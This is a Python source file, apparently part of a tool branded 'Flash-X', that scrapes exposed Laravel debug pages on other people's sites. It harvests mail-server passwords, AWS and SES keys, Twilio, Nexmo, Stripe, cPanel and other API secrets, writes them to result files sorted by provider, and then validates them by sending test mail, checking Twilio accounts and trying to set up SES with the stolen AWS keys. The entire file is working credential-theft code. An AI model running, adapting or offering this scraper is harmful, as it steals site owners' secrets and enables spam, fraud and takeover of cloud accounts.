from re import findall
from iprange import tools
from iprange import sendtest

sendgrid = tools.sendgrid()
aws = tools.aws()
mailgun = tools.mailgun()
sparkpostmail = tools.sparkpostmail()
mandrillapp = tools.mandrillapp()
zoho = tools.zoho()
relay = tools.relay()
sendinblue = tools.sendinblue()
and1 = tools.and1()
zimbra = tools.zimbra()
office365 = tools.office365()
NEXMO = tools.NEXMO()
TOKBOX = tools.TOKBOX()
ONESIGNAL = tools.ONESIGNAL()
EXOTEL = tools.EXOTEL()
twillio = tools.twillio()

def get_smtp2(url,text):
  try:
    if "<td>MAIL_HOST</td>" in text:
      if "<td>MAIL_HOST</td>" in text:
        mailhost = findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailport = findall('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailport =  587
        mailuser = findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailpass = findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailfrom = findall('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailfrom = "unknown@unknown.com"
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = findall("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = findall("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = findall("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = findall('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(emailform)
          remover = str(build).replace('\r', '')
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m amazonaws\n".format(str(url)))
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest.sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            pass
        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSendgrid\n".format(str(url)))
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmailgun\n".format(str(url)))
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msparkpostmail\n".format(str(url)))
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmandrillapp\n".format(str(url)))
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mzoho\n".format(str(url)))
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mrelay\n".format(str(url)))
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m1and1\n".format(str(url)))
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40moffice365\n".format(str(url)))
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mZimbra\n".format(str(url)))
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSMTP Random\n".format(str(url)))
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mInvalid SMTP\n".format(str(url)))  
        try:
          sendtest.sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed Send\n".format(str(url)))
    else:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed GET SMTP".format(str(url)))

    if '<td>TWILIO_ACCOUNT_SID</td>' in text and twillio() == "on":
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTwillio\n".format(str(url)))
      acc_sid = findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_key = findall('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_key = "NULL"
      try:
        sec = findall('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        sec = "NULL"
      try:
        chatid = findall('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        chatid = "null"
      try:
        phone = findall('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = "NULL"
      try:
        auhtoken = findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        auhtoken = "NULL"
      build = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        tools.twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif '<td>TWILIO_SID</td>' in text:
      acc_sid = findall('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = findall('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = findall('<td>TWILIO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        tools.twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))

    elif '<td>ACCOUNT_SID</td>' in text:
      acc_sid = findall('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = findall('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = findall('<td>Twilio_Number<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        tools.twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))

    
    if '<td>NEXMO_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = findall('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        tools.nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
    
    elif '<td>NEXMO_API_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = findall('<td>NEXMO_API_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        tools.nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
    elif 'NEXMO_KEY' not in text or 'NEXMO_KEY' in text and NEXMO() == "off":
      pass
    else:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed NEXMO\n".format(str(url)))


    if '<td>AWS_ACCESS_KEY_ID</td>' in text:
      aws_kid = findall('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = findall('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = findall('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          tools.autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>AWS_KEY</td>' in text:
      aws_kid = findall('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = findall('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = findall('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          tools.autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>AWSAPP_KEY</td>' in text:
      aws_kid = findall('<td>AWSAPP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = findall('<td>AWSAPP_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = findall('<td>AWSAPP_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWSAPP_KEY: '+str(aws_kid)+'\nAWSAPP_SECRET: '+str(aws_sky)+'\nAWSAPP_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          tools.autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>SES_KEY</td>' in text:
      aws_kid = findall('<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = findall('<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = findall('<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(aws_kid)+'\nSES_SECRET: '+str(aws_sky)+'\nSES_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          tools.autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    
    if '<td>MAILER_DSN</td>' in text:
      aws_kid = findall('<td>MAILER_DSN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(aws_kid)
      remover = str(build).replace('\r', '')
      if str(aws_kid) != "" and  str(aws_kid) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if '<td>EXOTEL_API_KEY</td>' in text and EXOTEL() == "on":
      try:
        exotel_api = findall('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_api = ''
      try:
        exotel_token = findall('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_token = ''
      try:
        exotel_sid = findall('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_sid = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mEXOTEL\n".format(str(url)))
      build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
      remover = str(build).replace('\r', '')
      save = open('result/EXOTEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()


    if '<td>ONESIGNAL_APP_ID</td>' in text and ONESIGNAL() == "on":
      try:
        onesignal_id = findall('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_id = ''
      try:
        onesignal_token = findall('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_token = ''
      try:
        onesignal_auth = findall('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_auth = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mONESIGNAL\n".format(str(url)))
      build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
      remover = str(build).replace('\r', '')
      save = open('result/ONESIGNAL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if '<td>TOKBOX_KEY_DEV</td>' in text and TOKBOX() == "on":
      try:
        tokbox_key = findall('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = findall('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif '<td>TOKBOX_KEY</td>' in text:
      try:
        tokbox_key = findall('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = findall('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    
    if '<td>CPANEL_HOST</td>' in text:
      method = 'debug'
      try:
        cipanel_host = findall('<td>CPANEL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = findall('<td>CPANEL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = findall('<td>CPANEL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = findall('<td>CPANEL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_pw = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "<td>STRIPE_KEY</td>" in text:
      method = 'debug'
      try:
        stripe_1 = findall("<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = findall("<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass